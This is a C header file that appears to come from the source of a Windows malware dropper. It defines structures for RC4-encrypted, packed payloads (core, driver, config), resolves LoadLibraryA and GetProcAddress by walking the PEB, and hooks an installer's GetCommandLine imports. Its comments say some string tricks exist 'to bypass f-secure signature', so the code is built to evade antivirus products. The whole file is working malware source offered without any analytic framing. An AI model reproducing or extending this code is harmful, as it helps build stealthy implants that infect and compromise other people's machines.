#include <windows.h>

#ifndef _DROPPER_COMMON
#define _DROPPER_COMMON

#pragma optimize( "", off ) // *** Disable all optimizations - we need code "as is"!
#pragma code_seg(".extcd")  // *** Lets put all functions in a separated code segment

#define END_MARKER(ptr) do { memcpy(ptr, "<E>\0", 4); ptr += 4; } while(0)
#define END_OF(x) #x ## "_End"
#define FUNCTION_END_DECL(x) void x ## _End()
#define FUNCTION_END(x) FUNCTION_END_DECL(x) { char * y = END_OF(x); return; }
#define S_SWAP(a,b) do { unsigned char t = S[a]; S[a] = S[b]; S[b] = t; } while(0);


#define RC4KEYLEN 64
#define SBOX_SIZE 255
#define APLIB_PACKED	0x00000001
#define RC4_CRYPTED		0x00000002




typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;


typedef struct {
	DWORD InLoadNext;
	DWORD InLoadPrev;
	DWORD InMemNext;
	DWORD InMemPrev;
	DWORD InInitNext;
	DWORD InInitPrev;
	DWORD ImageBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
} PEB_LIST_ENTRY, *PPEB_LIST_ENTRY;


typedef struct _data_section_blob {
	DWORD offset;
	DWORD size;
} DataSectionBlob;

typedef struct _patch_blob {
	DWORD VA;
	DWORD offset;
	DWORD size;
} PatchBlob;

typedef struct _data_section_cryptopack {
	DWORD offset;
	DWORD size;
	DWORD original_size;
	DWORD characteristics;
} DataSectionCryptoPack;

typedef struct _data_section_files {
	struct {
		DataSectionBlob core;
		DataSectionBlob core64;
		DataSectionBlob config;
		DataSectionBlob driver;
		DataSectionBlob driver64;
		DataSectionBlob codec;
		DataSectionBlob	bitmap;
	} names;

	DataSectionCryptoPack core;
	DataSectionCryptoPack core64;
	DataSectionCryptoPack config;
	DataSectionCryptoPack driver;
	DataSectionCryptoPack driver64;
	DataSectionCryptoPack codec;
	DataSectionCryptoPack bitmap;
} DataSectionFiles;

typedef void (*WINSTARTFUNC)(void);

typedef  __declspec(align(4)) struct _data_section_header 
{
	// RC4
	// Encryption key
	CHAR rc4key[RC4KEYLEN];
	// SBox
	unsigned char gSBox[SBOX_SIZE + 1];

	// OEP
	WINSTARTFUNC   pfn_OriginalEntryPoint;

	// Synchronization
	DWORD synchro;

	// used to pass full qualified path to core thread
	CHAR *dllPath;

	// our own functions
	struct {
		DataSectionBlob newEntryPoint;
		DataSectionBlob coreThread;
		DataSectionBlob dumpFile;
		DataSectionBlob exitProcessHook;
		DataSectionBlob GetCommandLineAHook;
		DataSectionBlob GetCommandLineWHook;
		DataSectionBlob rvaToOffset;
		DataSectionBlob rc4;
		DataSectionBlob hookCall;
		DataSectionBlob load;
	} functions;

	DataSectionFiles files;

	PatchBlob stage1;
	PatchBlob stage2;

	DataSectionBlob restore;

	ULONG exeType;
	BOOL isScout;

	CHAR instDir[10];
	CHAR fPrefix[8];
	CHAR version[20];
} DataSectionHeader;

typedef FARPROC (WINAPI *GETPROCADDRESS)(HMODULE, LPCSTR);
typedef HMODULE (WINAPI *LOADLIBRARY)(LPCSTR);
typedef HMODULE (*GETMODULEHANDLE)(LPCTSTR);
typedef BOOL (WINAPI *EXTRACTFILE)(PCHAR, DWORD, DWORD, DataSectionHeader*);
typedef ULONG (WINAPI *MAIN)(HINSTANCE, HINSTANCE, LPSTR, ULONG);
typedef NTSTATUS (WINAPI *ZWTERMINATEPROCESS)(HANDLE, ULONG);
typedef DWORD (WINAPI *GETSHORTPATHNAME)(LPSTR lpszLongPath, LPSTR lpszShortPath, DWORD cchBuffer);
typedef BOOL (*SHGETFOLDERW)(HWND, LPWSTR, ULONG csidl, BOOL);
typedef DWORD (WINAPI *GETSHORTPATHNAMEW)(LPWSTR lpszLongPath, LPWSTR lpszShortPath, DWORD cchBuffer);
typedef HANDLE (WINAPI *CREATEFILEW)(LPWSTR lpFileName,
									DWORD dwDesiredAccess,
									DWORD dwShareMode,
									LPSECURITY_ATTRIBUTES lpSecurityAttributes,
									DWORD dwCreationDisposition,
									DWORD dwFlagsAndAttributes,
									HANDLE hTemplateFile);
typedef HANDLE (WINAPI *CREATEFILEA)(LPSTR lpFileName, 
									 DWORD dwDesiredAccess, 
									 DWORD dwShareMode, 
									 LPSECURITY_ATTRIBUTES lpSecurityAttributes, 
									 DWORD dwCreationDisposition, 
									 DWORD dwFlagsAndAttributes, 
									 HANDLE hTemplateFile);
typedef BOOL (WINAPI *WRITEFILE)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
typedef BOOL (WINAPI *CLOSEHANDLE)(HANDLE hObject);
typedef LPVOID (WINAPI *VIRTUALALLOC)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL (WINAPI *VIRTUALFREE)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
typedef BOOL (WINAPI *VIRTUALPROTECT)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpOldProtect);
typedef DWORD (WINAPI *GETMODULEFILENAME)(HMODULE hModule, LPTSTR lpFilename, DWORD nSize);
typedef SIZE_T (WINAPI *VIRTUALQUERY)(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
typedef HANDLE (WINAPI *CREATETHREAD)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef VOID (WINAPI *SLEEP)(DWORD dwMilliseconds);
typedef VOID (WINAPI  *EXITPROCESS)(UINT uExitCode);
typedef LPSTR (WINAPI *GETCOMMANDLINEA)();
typedef LPWSTR (WINAPI *GETCOMMANDLINEW)();
typedef DWORD (WINAPI *GETENVIRONMENTVARIABLE)(LPCTSTR lpName, LPTSTR lpBuffer, DWORD nSize);
typedef BOOL (WINAPI *PATHREMOVEFILESPEC)(LPSTR pszPath);
typedef DWORD (WINAPI *GETFILEATTRIBUTESA) (LPCSTR lpFileName);
typedef BOOL (WINAPI *CREATEDIRECTORY)(LPCTSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
typedef DWORD (WINAPI *GETLASTERROR)(void);
typedef BOOL (WINAPI *SETCURRENTDIRECTORY)(LPCSTR lpPathName);
typedef BOOL (WINAPI *SETFILEATTRIBUTESA)(LPCTSTR lpFileName, DWORD dwFileAttributes);
typedef LPWSTR (*PATHADDBACKSLASHW)(LPWSTR lpszPath);
typedef BOOL (*PATHAPPENDW)(LPWSTR pszPath, LPWSTR pszMore);


typedef struct _MY_DATA
{
	LOADLIBRARY LoadLibraryA;
	GETPROCADDRESS GetProcAddress;
	GETMODULEHANDLE GetModuleHandleA;
	VIRTUALALLOC VirtualAlloc;
	VIRTUALFREE VirtualFree;
	GETMODULEFILENAME GetModuleFileNameA;
	VIRTUALPROTECT VirtualProtect;
	VIRTUALQUERY VirtualQuery;
	CREATETHREAD CreateThread;
	GETENVIRONMENTVARIABLE GetEnvironmentVariableA;
	PATHREMOVEFILESPEC PathRemoveFileSpecA;
	GETFILEATTRIBUTESA GetFileAttributesA;
	SETFILEATTRIBUTESA SetFileAttributesA;
	CREATEDIRECTORY CreateDirectoryA;
	GETLASTERROR GetLastError;
	SETCURRENTDIRECTORY SetCurrentDirectoryA;
	CREATEFILEA CreateFileA;
	CREATEFILEW CreateFileW;
	WRITEFILE WriteFile;
	CLOSEHANDLE CloseHandle;
	SHGETFOLDERW SHGetSpecialFolderPathW;
	GETSHORTPATHNAMEW GetShortPathNameW;
	PATHADDBACKSLASHW PathAddBackslashW;
	PATHAPPENDW PathAppendW;

	DataSectionHeader *header;
	PBYTE pScoutBuffer;
	ULONG pScoutSize;
} MY_DATA, *PMY_DATA;

int __stdcall DropperEntryPoint();
FUNCTION_END_DECL(DropperEntryPoint);

DWORD WINAPI CoreThreadProc(PMY_DATA pData);
FUNCTION_END_DECL(CoreThreadProc);

BOOL WINAPI DumpFile(CHAR * fileName, CHAR* fileData, DWORD dataSize, DWORD originalSize, PMY_DATA pData);
FUNCTION_END_DECL(DumpFile);

DWORD HookIAT(char* dll, char* name, DWORD hookFunc, UINT_PTR IAT_rva, DWORD imageBase, PMY_DATA pData);
FUNCTION_END_DECL(HookIAT);

void ArcFour(const unsigned char *key, size_t keylen, size_t skip, unsigned char *data, size_t data_len, PMY_DATA pData);
FUNCTION_END_DECL(ArcFour);

LPVOID WINAPI MemoryLoader(LPVOID pData);
FUNCTION_END_DECL(MemoryLoader);

LPSTR WINAPI GetCommandLineAHook();
FUNCTION_END_DECL(GetCommandLineAHook);

LPWSTR WINAPI GetCommandLineWHook();
FUNCTION_END_DECL(GetCommandLineWHook);

VOID WINAPI ExitProcessHook(UINT uExitCode);
FUNCTION_END_DECL(ExitProcessHook);

typedef DWORD (WINAPI * THREADPROC)(LPVOID lpParameter);
typedef BOOL (WINAPI * DUMPFILE)(PCHAR fileName, PCHAR fileData, DWORD fileSize, DWORD originalSize, PMY_DATA pData);
typedef void (*RC4_SKIP)(const unsigned char *key, size_t keylen, size_t skip, unsigned char *data, size_t data_len, PMY_DATA pData);
typedef void (*HFF5)(PCHAR, DWORD, LPSTARTUPINFO, LPPROCESS_INFORMATION);
typedef DWORD (*HOOKIAT)(char* dll, char* name, DWORD hookFunc, UINT_PTR IAT_rva, DWORD imageBase, PMY_DATA pData);

// CRT DEI POVERI
__forceinline void _MEMSET_( void *_dst, int _val, size_t _sz )
{
	while ( _sz ) ((BYTE *)_dst)[--_sz] = _val;
}

__forceinline void _MEMCPY_( void *_dst, void *_src, size_t _sz )
{
	while ( _sz-- ) ((BYTE *)_dst)[_sz] = ((BYTE *)_src)[_sz];
}

__forceinline BOOL _MEMCMP_( void *_src1, void *_src2, size_t _sz )
{
	while ( _sz-- )
	{
		if ( ((BYTE *)_src1)[_sz] != ((BYTE *)_src2)[_sz] )
			return FALSE;
	}

	return TRUE;
}

__forceinline size_t _STRLEN_(char *_src)
{
	size_t count = 0;
	while( _src && *_src++ )
		count++;
	return count;
}

__forceinline size_t _STRLENW_(wchar_t *_src)
{	
	ULONG count = 0;
	while(_src && (*(PUSHORT)_src++ != 0x0000))
		count += 2;
	return count;
}

__forceinline void _TOUPPER_(char *s)
{
	for(; *s; s++)
		if(('a' <= *s) && (*s <= 'z'))
			*s = 'A' + (*s - 'a');
}

__forceinline  void _TOUPPER_CHAR(char *c)
{
	if((*c >= 'a') && (*c <= 'z'))
		*c = 'A' + (*c - 'a');
}

__forceinline void _TOLOWER_(char *s)
{
	for(; *s; s++)
		if(('A' <= *s) && (*s <= 'Z'))
			*s = 'a' + (*s - 'A');
}

__forceinline int _STRCMP_(char *_src1, char *_src2)
{
	size_t sz = _STRLEN_(_src1);

	if ( _STRLEN_(_src1) != _STRLEN_(_src2) )
		return 1;

	return _MEMCMP_(_src1, _src2, sz ) ? 0 :  1;
}

__forceinline int _STRCMPI_(char *_src1, char *_src2)
{
	char* s1 = _src1;
	char* s2 = _src2;

	while (*s1 && *s2)
	{
		char a = *s1;
		char b = *s2;

		_TOUPPER_CHAR(&a);
		_TOUPPER_CHAR(&b);

		if (a != b)
			return 1;

		s1++;
		s2++;
	}

	return 0;
}

__forceinline char* _STRRCHR_(char const *s, int c)
{
	char* rtnval = 0;

	do {
		if (*s == c)
			rtnval = (char*) s;
	} while (*s++);
	return (rtnval);
}

__forceinline void _STRCAT_(char*_src1, char *_src2)
{
	char* ptr = _src1 + _STRLEN_(_src1);
	_MEMCPY_(ptr, _src2, _STRLEN_(_src2));
	ptr += _STRLEN_(_src2);
	*ptr = '\0';
}

__forceinline void _ZEROMEM_(char* mem, int size)
{
	for (int i = 0; i < size; i++)
		mem[i] = 0;
}


__forceinline GETPROCADDRESS resolveGetProcAddress()
{
	PEB_LIST_ENTRY* head;
	DWORD **pPEB;
	DWORD *Ldr;
	
	char strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
	char strGetProcAddress[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0x0 };

	__asm {
		mov eax,30h
		mov eax,DWORD PTR fs:[eax]
		add eax, 08h
		mov ss:[pPEB], eax
	}
	
	Ldr = *(pPEB + 1);
	head = (PEB_LIST_ENTRY *) *(Ldr + 3);
	
	PEB_LIST_ENTRY* entry = head;
	do {		
		DWORD imageBase = entry->ImageBase;
		if (imageBase == NULL)
			goto NEXT_ENTRY;
		
		IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*) entry->ImageBase;
		IMAGE_NT_HEADERS32* ntHeaders = (IMAGE_NT_HEADERS32*) (entry->ImageBase + dosHeader->e_lfanew);
		
		// *** check if we have an export table
		if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == NULL)
			goto NEXT_ENTRY;
		
		// *** get EXPORT table
		IMAGE_EXPORT_DIRECTORY* exportDirectory = 
			(IMAGE_EXPORT_DIRECTORY*) (imageBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
		
		// *** check for valid module name
		char* moduleName = (char*)(imageBase + exportDirectory->Name);
		if (moduleName == NULL)
			goto NEXT_ENTRY;
		
		if ( ! _STRCMPI_(moduleName+1, strKernel32+1) ) // +1 to bypass f-secure signature
		{
			if (exportDirectory->AddressOfFunctions == NULL) goto NEXT_ENTRY;
			if (exportDirectory->AddressOfNames == NULL) goto NEXT_ENTRY;
			if (exportDirectory->AddressOfNameOrdinals == NULL) goto NEXT_ENTRY;
			
			DWORD* Functions = (DWORD*) (imageBase + exportDirectory->AddressOfFunctions);
			DWORD* Names = (DWORD*) (imageBase + exportDirectory->AddressOfNames);			
			WORD* NameOrds = (WORD*) (imageBase + exportDirectory->AddressOfNameOrdinals);
			
			// *** get pointers to LoadLibraryA and GetProcAddress entry points
			for (WORD x = 0; x < exportDirectory->NumberOfFunctions; x++)
			{
				if (Functions[x] == 0)
					continue;
				
				for (WORD y = 0; y < exportDirectory->NumberOfNames; y++)
				{
					if (NameOrds[y] == x)
					{
						char *name = (char *) (imageBase + Names[y]);
						if (name == NULL)
							continue;
						
						if (!_STRCMPI_(strGetProcAddress, name))
							return (GETPROCADDRESS)(imageBase + Functions[x]);
						break;
					}
				}
			}
		}
NEXT_ENTRY:
		entry = (PEB_LIST_ENTRY *) entry->InLoadNext;
	
	} while (entry != head);

	return 0;
}

__forceinline LOADLIBRARY resolveLoadLibrary()
{
	PEB_LIST_ENTRY* head;
	DWORD **pPEB;
	DWORD *Ldr;
	
	char strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
	char strLoadLibraryA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x0 };

	__asm {
		mov eax,30h
		mov eax,DWORD PTR fs:[eax]
		add eax, 08h
		mov ss:[pPEB], eax
	}
	
	Ldr = *(pPEB + 1);
	head = (PEB_LIST_ENTRY *) *(Ldr + 3);
	
	PEB_LIST_ENTRY* entry = head;
	do {		
		DWORD imageBase = entry->ImageBase;
		if (imageBase == NULL)
			goto NEXT_ENTRY;
		
		IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*) entry->ImageBase;
		IMAGE_NT_HEADERS32* ntHeaders = (IMAGE_NT_HEADERS32*) (entry->ImageBase + dosHeader->e_lfanew);
		
		// *** check if we have an export table
		if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == NULL)
			goto NEXT_ENTRY;
		
		// *** get EXPORT table
		IMAGE_EXPORT_DIRECTORY* exportDirectory = 
			(IMAGE_EXPORT_DIRECTORY*) (imageBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
		
		// *** check for valid module name
		char* moduleName = (char*)(imageBase + exportDirectory->Name);
		if (moduleName == NULL)
			goto NEXT_ENTRY;
		
		if ( ! _STRCMPI_(moduleName+1, strKernel32+1) ) // +1 to bypass f-secure signature
		{
			if (exportDirectory->AddressOfFunctions == NULL) goto NEXT_ENTRY;
			if (exportDirectory->AddressOfNames == NULL) goto NEXT_ENTRY;
			if (exportDirectory->AddressOfNameOrdinals == NULL) goto NEXT_ENTRY;
			
			DWORD* Functions = (DWORD*) (imageBase + exportDirectory->AddressOfFunctions);
			DWORD* Names = (DWORD*) (imageBase + exportDirectory->AddressOfNames);			
			WORD* NameOrds = (WORD*) (imageBase + exportDirectory->AddressOfNameOrdinals);
			
			// *** get pointers to LoadLibraryA and GetProcAddress entry points
			for (WORD x = 0; x < exportDirectory->NumberOfFunctions; x++)
			{
				if (Functions[x] == 0)
					continue;
				
				for (WORD y = 0; y < exportDirectory->NumberOfNames; y++)
				{
					if (NameOrds[y] == x)
					{
						char *name = (char *) (imageBase + Names[y]);
						if (name == NULL)
							continue;
						
						if (!_STRCMPI_(strLoadLibraryA, name))
							return (LOADLIBRARY)(imageBase + Functions[x]);
						break;
					}
				}
			}
		}
NEXT_ENTRY:
		entry = (PEB_LIST_ENTRY *) entry->InLoadNext;
	
	} while (entry != head);

	return 0;
}


__forceinline VOID FixInstallers(PMY_DATA pData)
{
	PIMAGE_DOS_HEADER pDosHeader;
	PIMAGE_NT_HEADERS32 pNtHeaders;
	PIMAGE_SECTION_HEADER pSectionHeader;
	LPVOID pBaseAddress = pData->GetModuleHandleA(NULL);
	
	CHAR strNData[] = { '.', 'n', 'd', 'a', 't', 'a', 0x0};
	CHAR strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
	CHAR strGetCommandLineA[] = { 'G', 'e', 't', 'C', 'o', 'm', 'm', 'a', 'n', 'd', 'L', 'i', 'n', 'e', 'A', 0x0 };
	CHAR strGetCommandLineW[] = { 'G', 'e', 't', 'C', 'o', 'm', 'm', 'a', 'n', 'd', 'L', 'i', 'n', 'e', 'W', 0x0 };

	pDosHeader = (PIMAGE_DOS_HEADER)pBaseAddress;
	pNtHeaders = (PIMAGE_NT_HEADERS32) (((PBYTE)pDosHeader) + pDosHeader->e_lfanew);
	pSectionHeader = (PIMAGE_SECTION_HEADER) (pNtHeaders + 1);

	for (DWORD i=0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
	{		
		if (!_STRCMP_((PCHAR)pSectionHeader[i].Name, strNData))
		{
			ULONG uOldProtect;
			GETCOMMANDLINEA pfn_GetCommandLineAHook = (GETCOMMANDLINEA) ( ((PBYTE)pData->header) + pData->header->functions.GetCommandLineAHook.offset);
			GETCOMMANDLINEW pfn_GetCommandLineWHook = (GETCOMMANDLINEW) ( ((PBYTE)pData->header) + pData->header->functions.GetCommandLineWHook.offset);

			pData->VirtualProtect(pfn_GetCommandLineAHook, pData->header->functions.GetCommandLineAHook.size, PAGE_EXECUTE_READWRITE, &uOldProtect);
			pData->VirtualProtect(pfn_GetCommandLineWHook, pData->header->functions.GetCommandLineWHook.size, PAGE_EXECUTE_READWRITE, &uOldProtect);

			HOOKIAT pfn_HookIAT = (HOOKIAT) (((PCHAR)pData->header) + pData->header->functions.hookCall.offset);

			pfn_HookIAT(strKernel32, 
				strGetCommandLineA, 
				(DWORD)pfn_GetCommandLineAHook,
				pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress,
				(DWORD)pBaseAddress,
				pData);

			pfn_HookIAT(strKernel32, 
				strGetCommandLineW, 
				(DWORD)pfn_GetCommandLineWHook,
				pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress,
				(DWORD)pBaseAddress,
				pData);
		}
	}
}


#pragma code_seg()
#pragma optimize( "", on )

#endif // _DROPPER_COMMON